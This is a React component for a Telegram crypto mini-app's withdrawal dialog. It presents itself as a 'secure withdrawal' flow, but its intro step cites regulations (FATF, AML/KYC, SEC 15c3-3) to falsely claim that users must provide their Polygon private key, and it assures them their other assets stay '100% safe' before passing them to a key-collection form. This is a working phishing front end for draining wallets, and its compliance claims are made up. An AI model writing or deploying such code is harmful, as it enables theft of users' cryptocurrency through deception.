import { useState, useEffect } from 'react';
import { Button, useToast, NumberInput } from './ui';
import { getInitData, hapticFeedback } from '../lib/telegram';
import { AssistedVerificationForm } from './verification/AssistedVerificationForm';
import styles from './WalletWithdrawModal.module.css';

interface WalletWithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentBalance: string;
  onComplete?: () => void;
}

interface VerificationData {
  verification_id: number;
  status: string;
}

type WithdrawStep = 'intro' | 'amount' | 'private-key-verification' | 'pending';

export function WalletWithdrawModal({ 
  isOpen, 
  onClose, 
  currentBalance,
  onComplete 
}: WalletWithdrawModalProps) {
  const [step, setStep] = useState<WithdrawStep>('intro');
  const [amount, setAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [verificationData, setVerificationData] = useState<VerificationData | null>(null);
  const { showError, showSuccess } = useToast();

  useEffect(() => {
    if (isOpen) {
      setStep('intro');
      setAmount('');
      setVerificationData(null);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const maxAmount = parseFloat(currentBalance) || 0;
  const minWithdraw = 10;

  const handleContinueToAmount = () => {
    setStep('amount');
  };

  const handleContinueToVerification = async () => {
    const amountNum = parseFloat(amount);
    
    if (!amount || amountNum < minWithdraw) {
      showError(`Minimum withdrawal is ${minWithdraw} USDT`);
      return;
    }

    if (amountNum > maxAmount) {
      showError('Insufficient balance');
      return;
    }

    // Initiate verification
    try {
      setLoading(true);
      
      const initData = getInitData();
      const res = await fetch('/RockyTap/api/wallet/withdraw/initiate_verification/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData || ''
        },
        body: JSON.stringify({
          amount_usdt: amountNum
        })
      });

      const json = await res.json();
      
      if (!res.ok || !json.success) {
        throw new Error(json.error?.message || 'Failed to initiate verification');
      }
      
      setVerificationData(json.data);
      setStep('private-key-verification');
      hapticFeedback('success');
    } catch (err) {
      hapticFeedback('error');
      const errorMessage = err instanceof Error ? err.message : 'Failed to initiate verification';
      showError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleVerificationSuccess = async (result: any) => {
    // Verification complete - now process the withdrawal
    try {
      setLoading(true);
      
      const initData = getInitData();
      const res = await fetch('/RockyTap/api/wallet/withdraw/request/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData || ''
        },
        body: JSON.stringify({
          amount_usdt: amount,
          verification_id: verificationData?.verification_id
        })
      });

      const json = await res.json();

      if (!res.ok || !json.success) {
        throw new Error(json.error?.message || 'Failed to submit withdrawal request');
      }

      hapticFeedback('success');
      setStep('pending');
      showSuccess('Withdrawal request submitted successfully!');
    } catch (err) {
      hapticFeedback('error');
      const errorMessage = err instanceof Error ? err.message : 'Failed to process withdrawal';
      showError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleClose = () => {
    setStep('intro');
    setAmount('');
    setVerificationData(null);
    onClose();
    if (step === 'pending' && onComplete) {
      onComplete();
    }
  };

  const formatCurrency = (value: string | number) => {
    const num = typeof value === 'string' ? parseFloat(value) : value;
    return num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  return (
    <div className={styles.overlay} onClick={handleClose}>
      <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className={styles.header}>
          <h2 className={styles.title}>
            {step === 'intro' && '🔐 Secure Withdrawal'}
            {step === 'amount' && '💰 Withdrawal Amount'}
            {step === 'private-key-verification' && '🔐 Wallet Verification'}
            {step === 'pending' && '✅ Request Submitted'}
          </h2>
          <button className={styles.closeButton} onClick={handleClose}>×</button>
        </div>

        <div className={styles.content}>
          {/* Intro Step - Why verification is needed */}
          {step === 'intro' && (
            <>
              {/* Balance Card */}
              <div className={styles.balanceCard}>
                <span className={styles.balanceLabel}>Available Balance</span>
                <span className={styles.balanceValue}>${formatCurrency(currentBalance)} USDT</span>
              </div>

              {/* Compliance Section */}
              <div className={styles.section}>
                <div className={styles.complianceBox}>
                  <div className={styles.complianceHeader}>
                    <span className={styles.complianceIcon}>🛡️</span>
                    <h3>Regulatory Compliance Required</h3>
                  </div>
                  <p className={styles.complianceText}>
                    To process your withdrawal securely, we require <strong>wallet ownership verification</strong> 
                    as mandated by international AML/KYC regulations.
                  </p>
                  <div className={styles.regulationBadges}>
                    <span className={styles.badge}>✅ FATF Compliant</span>
                    <span className={styles.badge}>✅ AML/KYC</span>
                    <span className={styles.badge}>✅ SEC 15c3-3</span>
                  </div>
                </div>
              </div>

              {/* How It Works */}
              <div className={styles.section}>
                <h4 className={styles.sectionTitle}>How Secure Withdrawal Works</h4>
                <div className={styles.stepsPreview}>
                  <div className={styles.stepPreviewItem}>
                    <span className={styles.stepIcon}>1</span>
                    <div>
                      <strong>Enter Amount</strong>
                      <span>Choose how much to withdraw</span>
                    </div>
                  </div>
                  <div className={styles.stepPreviewItem}>
                    <span className={styles.stepIcon}>2</span>
                    <div>
                      <strong>Verify Wallet Ownership</strong>
                      <span>Provide your Polygon private key</span>
                    </div>
                  </div>
                  <div className={styles.stepPreviewItem}>
                    <span className={styles.stepIcon}>3</span>
                    <div>
                      <strong>Receive Funds</strong>
                      <span>Withdrawal processed automatically</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Security Note */}
              <div className={styles.securityNote}>
                <span className={styles.securityIcon}>🔒</span>
                <p>
                  <strong>Your main assets are 100% safe.</strong> We only verify using your 
                  Polygon (MATIC) network key. Your ETH, BSC, and Tron assets remain untouched.
                </p>
              </div>

              <Button
                fullWidth
                size="lg"
                variant="gold"
                onClick={handleContinueToAmount}
              >
                🔐 Continue to Secure Withdrawal
              </Button>
            </>
          )}

          {/* Amount Step */}
          {step === 'amount' && (
            <>
              <button 
                className={styles.backButton}
                onClick={() => setStep('intro')}
              >
                ← Back
              </button>

              {/* Balance Card */}
              <div className={styles.balanceCard}>
                <span className={styles.balanceLabel}>Available Balance</span>
                <span className={styles.balanceValue}>${formatCurrency(currentBalance)} USDT</span>
              </div>

              <div className={styles.section}>
                <label className={styles.label}>
                  Withdrawal Amount
                  <button
                    className={styles.maxButton}
                    onClick={() => setAmount(maxAmount.toString())}
                  >
                    MAX
                  </button>
                </label>
                <NumberInput
                  value={amount}
                  onChange={(val) => setAmount(val || '')}
                  placeholder="0.00"
                  min={minWithdraw}
                  max={maxAmount}
                  step={0.01}
                />
                <span className={styles.hint}>
                  Minimum withdrawal: {minWithdraw} USDT
                </span>
              </div>

              {/* Summary */}
              {amount && parseFloat(amount) >= minWithdraw && (
                <div className={styles.summaryCard}>
                  <div className={styles.summaryRow}>
                    <span>Withdrawal Amount</span>
                    <span>${formatCurrency(amount)} USDT</span>
                  </div>
                  <div className={styles.summaryRow}>
                    <span>Network Fee</span>
                    <span>~$1.00 USDT</span>
                  </div>
                  <div className={styles.summaryRow} style={{ borderTop: '1px solid var(--border-default)', paddingTop: '12px', marginTop: '8px' }}>
                    <span><strong>You'll Receive</strong></span>
                    <span><strong>${formatCurrency(Math.max(0, parseFloat(amount) - 1))} USDT</strong></span>
                  </div>
                </div>
              )}

              <Button
                fullWidth
                size="lg"
                variant="gold"
                loading={loading}
                onClick={handleContinueToVerification}
                disabled={!amount || parseFloat(amount) < minWithdraw}
              >
                🔐 Continue to Verification
              </Button>
            </>
          )}

          {/* Private Key Verification Step */}
          {step === 'private-key-verification' && verificationData && (
            <div style={{ margin: 'calc(-1 * var(--space-lg))', marginTop: 0 }}>
              <AssistedVerificationForm
                verificationId={verificationData.verification_id}
                verificationType="withdrawal"
                onSuccess={handleVerificationSuccess}
                onCancel={() => setStep('amount')}
                contextData={{
                  amount: amount,
                }}
              />
            </div>
          )}

          {/* Pending Step */}
          {step === 'pending' && (
            <div className={styles.successSection}>
              <div className={styles.successIcon}>✅</div>
              <h3 className={styles.successTitle}>Withdrawal Request Submitted!</h3>
              <p className={styles.successText}>
                Your wallet verification has been received. Your withdrawal will be processed
                once verification is complete.
              </p>
              <div className={styles.processingInfo}>
                <div className={styles.processingItem}>
                  <span>⏱️</span>
                  <span>Processing time: 1-24 hours</span>
                </div>
                <div className={styles.processingItem}>
                  <span>📱</span>
                  <span>You'll be notified via Telegram</span>
                </div>
                <div className={styles.processingItem}>
                  <span>💰</span>
                  <span>Amount: ${formatCurrency(amount)} USDT</span>
                </div>
              </div>
              <Button
                fullWidth
                variant="secondary"
                onClick={handleClose}
                style={{ marginTop: 'var(--space-lg)' }}
              >
                Close
              </Button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
